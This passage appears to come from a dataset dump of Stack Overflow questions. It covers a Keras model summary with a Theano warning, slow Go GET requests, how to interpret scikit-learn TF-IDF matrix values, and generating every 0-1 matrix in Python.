…
/usr/local/lib/python2.7/dist-packages/theano/sandbox/cuda/__init__.py:600: UserWarning: Your cuDNN version is more recent than the one Theano officially supports. If you see any problems, try updating Theano or downgrading cuDNN to version 5.
  warnings.warn(warn)
____________________________________________________________________________________________________
Layer (type)                     Output Shape          Param #     Connected to                     
====================================================================================================
convolution2d_1 (Convolution2D)  (None, 16, 16, 256)   2560        convolution2d_input_1[0][0]      
____________________________________________________________________________________________________
maxpooling2d_1 (MaxPooling2D)    (None, 8, 8, 256)     0           convolution2d_1[0][0]            
____________________________________________________________________________________________________
convolution2d_2 (Convolution2D)  (None, 8, 8, 512)     1180160     maxpooling2d_1[0][0]             
____________________________________________________________________________________________________
maxpooling2d_2 (MaxPooling2D)    (None, 4, 4, 512)     0           convolution2d_2[0][0]            
____________________________________________________________________________________________________
convolution2d_3 (Convolution2D)  (None, 4, 4, 1024)    4719616     maxpooling2d_2[0][0]             
____________________________________________________________________________________________________
convolution2d_4 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_3[0][0]            
____________________________________________________________________________________________________
convolution2d_5 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_4[0][0]            
____________________________________________________________________________________________________
convolution2d_6 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_5[0][0]            
____________________________________________________________________________________________________
convolution2d_7 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_6[0][0]            
____________________________________________________________________________________________________
convolution2d_8 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_7[0][0]            
____________________________________________________________________________________________________
convolution2d_9 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_8[0][0]            
____________________________________________________________________________________________________
convolution2d_10 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_9[0][0]            
____________________________________________________________________________________________________
convolution2d_11 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_10[0][0]           
____________________________________________________________________________________________________
convolution2d_12 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_11[0][0]           
____________________________________________________________________________________________________
convolution2d_13 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_12[0][0]           
____________________________________________________________________________________________________
convolution2d_14 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_13[0][0]           
____________________________________________________________________________________________________
convolution2d_15 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_14[0][0]           
____________________________________________________________________________________________________
convolution2d_16 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_15[0][0]           
____________________________________________________________________________________________________
convolution2d_17 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_16[0][0]           
____________________________________________________________________________________________________
convolution2d_18 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_17[0][0]           
____________________________________________________________________________________________________
convolution2d_19 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_18[0][0]           
____________________________________________________________________________________________________
convolution2d_20 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_19[0][0]           
____________________________________________________________________________________________________
convolution2d_21 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_20[0][0]           
____________________________________________________________________________________________________
convolution2d_22 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_21[0][0]           
____________________________________________________________________________________________________
convolution2d_23 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_22[0][0]           
____________________________________________________________________________________________________
convolution2d_24 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_23[0][0]           
____________________________________________________________________________________________________
maxpooling2d_3 (MaxPooling2D)    (None, 2, 2, 1024)    0           convolution2d_24[0][0]           
____________________________________________________________________________________________________
convolution2d_25 (Convolution2D) (None, 2, 2, 256)     2359552     maxpooling2d_3[0][0]             
____________________________________________________________________________________________________
convolution2d_26 (Convolution2D) (None, 2, 2, 32)      73760       convolution2d_25[0][0]           
____________________________________________________________________________________________________
maxpooling2d_4 (MaxPooling2D)    (None, 1, 1, 32)      0           convolution2d_26[0][0]           
____________________________________________________________________________________________________
flatten_1 (Flatten)              (None, 32)            0           maxpooling2d_4[0][0]             
____________________________________________________________________________________________________
dense_1 (Dense)                  (None, 4)             132         flatten_1[0][0]                  
____________________________________________________________________________________________________
dense_2 (Dense)                  (None, 1)             5           dense_1[0][0]                    
====================================================================================================
Total params: 206538153
____________________________________________________________________________________________________
None
Thu Oct  6 09:05:42 2016       
+------------------------------------------------------+                       
| NVIDIA-SMI 352.63     Driver Version: 352.63         |                       
…
</ol>

<hr>

<p>So what am I doing wrong? Should I just expect GET requests to take this much longer in Go?</p>
"
40101873,2496988.0,2016-10-18 07:16:15+00:00,3,how to analyze the value of tfidf matrix in sklearn?,"<p>I am using sklearn KMeans algorithm for document clustering as guided in 
<a href=""http://brandonrose.org/clustering"" rel=""nofollow"">http://brandonrose.org/clustering</a></p>

<p>Here There is a calculation of TFIDF matrix. I have understood the concept behind the TFIDF technique.
But, when I printed this Matrix in the given program, The matrix is like this,</p>

<pre><code>  (0, 11)   0.238317554822
  (0, 34)   0.355850989305
  (0, 7)    0.355850989305
  (0, 21)   0.238317554822
  (0, 16)   0.355850989305
  (0, 35)   0.355850989305
  (0, 8)    0.355850989305
  (0, 17)   0.355850989305
  (0, 36)   0.355850989305
  (1, 11)   0.238317554822
  (1, 21)   0.238317554822
  (1, 23)   0.355850989305
  (1, 0)    0.355850989305
  (1, 24)   0.355850989305
  (1, 12)   0.355850989305
  (1, 22)   0.355850989305
  (1, 25)   0.355850989305
  (1, 13)   0.355850989305
  (2, 2)    0.27430356415
  (2, 18)   0.339992197465
  (2, 26)   0.339992197465
  (2, 39)   0.339992197465
  (2, 3)    0.339992197465
  (2, 19)   0.339992197465
  (2, 27)   0.339992197465
  (2, 4)    0.339992197465
  (2, 20)   0.339992197465
  (3, 2)    0.27430356415
  (3, 40)   0.339992197465
  (3, 9)    0.339992197465
  (3, 1)    0.339992197465
  (3, 5)    0.339992197465
  (3, 41)   0.339992197465
  (3, 10)   0.339992197465
  (3, 6)    0.339992197465
  (3, 42)   0.339992197465
  (4, 11)   0.202877476983
  (4, 21)   0.202877476983
  (4, 28)   0.302932576437
  (4, 31)   0.302932576437
  (4, 37)   0.302932576437
  (4, 14)   0.302932576437
  (4, 29)   0.302932576437
  (4, 32)   0.302932576437
  (4, 38)   0.302932576437
  (4, 15)   0.302932576437
  (4, 30)   0.302932576437
  (4, 33)   0.302932576437
</code></pre>

<p>What values this matrix is representing. ? can anybody worked on this can help me to understand this ?</p>
"
39948902,4724693.0,2016-10-09 21:49:24+00:00,3,How to generate all possible combinations of 0-1 matrix in Python?,"<p>How can generate all possible combinations of a 0-1 matrix of size K by N?</p>

<p>For example, if I take K=2 and N=2, I get the following combinations.</p>
…
